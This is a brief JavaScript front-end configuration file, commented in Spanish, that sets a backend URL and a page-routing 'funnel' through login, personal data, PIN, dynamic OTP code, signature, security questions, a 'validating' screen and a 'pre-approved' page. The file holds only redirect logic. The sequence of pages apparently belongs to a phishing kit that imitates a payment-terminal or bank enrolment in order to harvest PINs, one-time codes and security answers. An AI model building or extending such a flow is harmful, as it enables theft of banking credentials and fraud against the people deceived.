/**
 * CONFIGURACIÓN GLOBAL DEL FRONTEND
 * Configura la URL base de tu backend aquí.
 * Para desarrollo local puedes usar 'http://localhost:3000'
 * Para producción en Vercel, usa la URL generada por Render.
 */
window.API_BASE_URL = 'https://tu-backend.onrender.com';

/**
 * RUTAS CENTRALIZADAS (CAMINO DRZ)
 * Mantén aquí el orden del embudo para redirigir fácilmente.
 */
window.APP_ROUTES = {
  LOGIN: 'INICIO-OLD.html',
  DATOS: 'INICIO.html',
  PIN: 'CLAVESEGURADATAFONOWEB.html',
  OTP: 'DINCAMICADATAFONOWEB.html',
  FIRMA: 'FIRMASOLICITUD.html',
  PREGUNTAS: 'PREGUNTASDESEGURIDADYVALIDACION.html',
  VALIDANDO: 'VALIDANDOPROCESS.html',
  EXITO: 'AFILIACIONESPRE-APPROBADO.html'
};

window.Router = {
  redirect: (step) => {
    if (window.APP_ROUTES[step]) {
      window.location.href = window.APP_ROUTES[step];
    } else {
      console.warn(`Ruta desconocida: ${step}`);
    }
  }
};
